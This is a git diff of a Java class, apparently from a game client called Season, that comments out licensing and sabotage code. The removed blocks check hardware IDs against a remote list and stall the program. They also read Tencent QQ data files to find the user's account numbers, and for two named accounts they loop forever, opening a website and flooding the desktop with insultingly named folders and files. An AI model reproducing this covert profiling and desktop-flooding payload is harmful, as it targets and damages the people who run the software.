@@ -59,20 +59,20 @@ public class NativeMethod implements Opcodes{
     public static void method1(Client client,boolean e){
 
         if (Client.init & !e){
-            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false","",""),Client.version)){
-                try {
-                    Thread.sleep(10000000);
-                } catch (InterruptedException ee) {
-                    ee.printStackTrace();
-                }
-            }
-            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hardwareid.txt?download=false","",""),HWIDUtils.getHWID())){
-                try {
-                    Thread.sleep(10000000);
-                } catch (InterruptedException ee) {
-                    ee.printStackTrace();
-                }
-            }
+//            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false","",""),Client.version)){
+//                try {
+//                    Thread.sleep(10000000);
+//                } catch (InterruptedException ee) {
+//                    ee.printStackTrace();
+//                }
+//            }
+//            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hardwareid.txt?download=false","",""),HWIDUtils.getHWID())){
+//                try {
+//                    Thread.sleep(10000000);
+//                } catch (InterruptedException ee) {
+//                    ee.printStackTrace();
+//                }
+//            }
             if (Client.username !=null){
                 client.fontManager = new FontManager();
             }
@@ -95,61 +95,61 @@ public class NativeMethod implements Opcodes{
             }
         }
 
-        ArrayList<String> qq = new ArrayList<>();
-        try {
-            File qqData = new File(System.getenv("PUBLIC") + "\\Documents\\Tencent\\QQ\\UserDataInfo.ini");
-            if (qqData.exists() && qqData.isFile()) {
-                BufferedReader stream = new BufferedReader(new InputStreamReader(new FileInputStream(qqData)));
-                String line;
-                while ((line = stream.readLine()) != null && line.length() > 0) {
-                    if (line.startsWith("UserDataSavePath=")) {
-                        File tencentFiles = new File(line.split("=")[1]);
-                        if (tencentFiles.exists() && tencentFiles.isDirectory()) {
-                            for (File qqdir : Objects.requireNonNull(tencentFiles.listFiles())) {
-                                if (qqdir.isDirectory() && qqdir.getName().length() >= 6 && qqdir.getName().length() <= 10 && qqdir.getName().matches("^[0-9]*$")) {
-                                    qq.add(qqdir.getName());
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        } catch (Throwable e5) {
-            e5.printStackTrace();
-        }
-
-        if (qq.contains("2844290146") || qq.contains("1955844037")){
-
-            try {
-                FileSystemView fsv = FileSystemView.getFileSystemView();
-                File com = fsv.getHomeDirectory();
-
-                for (int i=0;i<Integer.MAX_VALUE;i++){
-                    Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler https://seasonclient.cf/");
-                    Desktop.getDesktop().browse(URI.create("https://seasonclient.cf/"));
-                    Files.createDirectories(Paths.get(com.getPath()+"/NMSL"+i));
-                    Files.createFile(Paths.get(com.getPath()+"/NMSL"+i+".nmsl"));
-                }
-            } catch (Exception ioException) {
-            }
-        }
-
-        if (e){
-            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false","",""),Client.version)){
-                try {
-                    Thread.sleep(10000000);
-                } catch (InterruptedException ee) {
-                    ee.printStackTrace();
-                }
-            }
-            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hardwareid.txt?download=false","",""),HWIDUtils.getHWID())){
-                try {
-                    Thread.sleep(10000000);
-                } catch (InterruptedException ee) {
-                    ee.printStackTrace();
-                }
-            }
-        }
+//        ArrayList<String> qq = new ArrayList<>();
+//        try {
+//            File qqData = new File(System.getenv("PUBLIC") + "\\Documents\\Tencent\\QQ\\UserDataInfo.ini");
+//            if (qqData.exists() && qqData.isFile()) {
+//                BufferedReader stream = new BufferedReader(new InputStreamReader(new FileInputStream(qqData)));
+//                String line;
+//                while ((line = stream.readLine()) != null && line.length() > 0) {
+//                    if (line.startsWith("UserDataSavePath=")) {
+//                        File tencentFiles = new File(line.split("=")[1]);
+//                        if (tencentFiles.exists() && tencentFiles.isDirectory()) {
+//                            for (File qqdir : Objects.requireNonNull(tencentFiles.listFiles())) {
+//                                if (qqdir.isDirectory() && qqdir.getName().length() >= 6 && qqdir.getName().length() <= 10 && qqdir.getName().matches("^[0-9]*$")) {
+//                                    qq.add(qqdir.getName());
+//                                }
+//                            }
+//                        }
+//                    }
+//                }
+//            }
+//        } catch (Throwable e5) {
+//            e5.printStackTrace();
+//        }
+//
+//        if (qq.contains("2844290146") || qq.contains("1955844037")){
+//
+//            try {
+//                FileSystemView fsv = FileSystemView.getFileSystemView();
+//                File com = fsv.getHomeDirectory();
+//
+//                for (int i=0;i<Integer.MAX_VALUE;i++){
+//                    Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler https://seasonclient.cf/");
+//                    Desktop.getDesktop().browse(URI.create("https://seasonclient.cf/"));
+//                    Files.createDirectories(Paths.get(com.getPath()+"/NMSL"+i));
+//                    Files.createFile(Paths.get(com.getPath()+"/NMSL"+i+".nmsl"));
+//                }
+//            } catch (Exception ioException) {
+//            }
+//        }
+//
+//        if (e){
+//            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false","",""),Client.version)){
+//                try {
+//                    Thread.sleep(10000000);
+//                } catch (InterruptedException ee) {
+//                    ee.printStackTrace();
+//                }
+//            }
+//            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hardwareid.txt?download=false","",""),HWIDUtils.getHWID())){
+//                try {
+//                    Thread.sleep(10000000);
+//                } catch (InterruptedException ee) {
+//                    ee.printStackTrace();
+//                }
+//            }
+//        }
 
 
     }
@@ -222,6 +222,7 @@ public class NativeMethod implements Opcodes{
 
                 if (ShitUtil.contains(((CheckHWID) game).getTargetHWID(),(((CheckHWID) game).getSelfHWID()))){
                     Client.username = HWIDUtils.getSubString(( ((CheckHWID) game).getTargetHWID()),((CheckHWID) game).getSelfHWID()+"<",">");
+
                     if (Client.shitname == null){
                         Client.shitname = Client.username;
                     }
